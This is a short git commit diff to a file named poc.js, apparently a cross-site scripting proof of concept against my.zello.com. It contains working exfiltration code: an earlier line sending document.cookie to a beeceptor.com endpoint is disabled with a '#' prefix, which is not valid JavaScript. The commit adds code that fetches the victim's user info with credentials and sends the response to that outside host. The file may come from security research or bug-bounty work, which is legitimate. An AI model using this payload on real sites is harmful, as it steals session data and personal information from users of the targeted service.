f8b5bb3d8a4e6b9196f197c4cee62b082995196f
Ambush <56769633+ambushneupane@users.noreply.github.com>
2025-11-03 19:04:44 +0545

    Update fetch calls for user info and logging
    Replace fetch call to log cookies with a call to fetch user info and log the response data.

--- poc.js
+++ poc.js
@@ -1,3 +1,18 @@
 alert("XSS on "+ document.domain)
 
-fetch(`https://ywhftw.free.beeceptor.com/log?cookie=${document.cookie}`)
+#fetch(`https://ywhftw.free.beeceptor.com/log?cookie=${document.cookie}`)
+
+fetch('https://my.zello.com/user/userinfo', {
+  method: 'GET',
+  credentials: 'include'
+})
+.then(response => response.text())
+.then(data => {
+  fetch('https://ywhftw.free.beeceptor.com/?data=' + encodeURIComponent(data), {
+    method: 'GET',
+    mode: 'no-cors'
+  });
+ 
+})
+.catch(error => console.error('Error:', error));
+
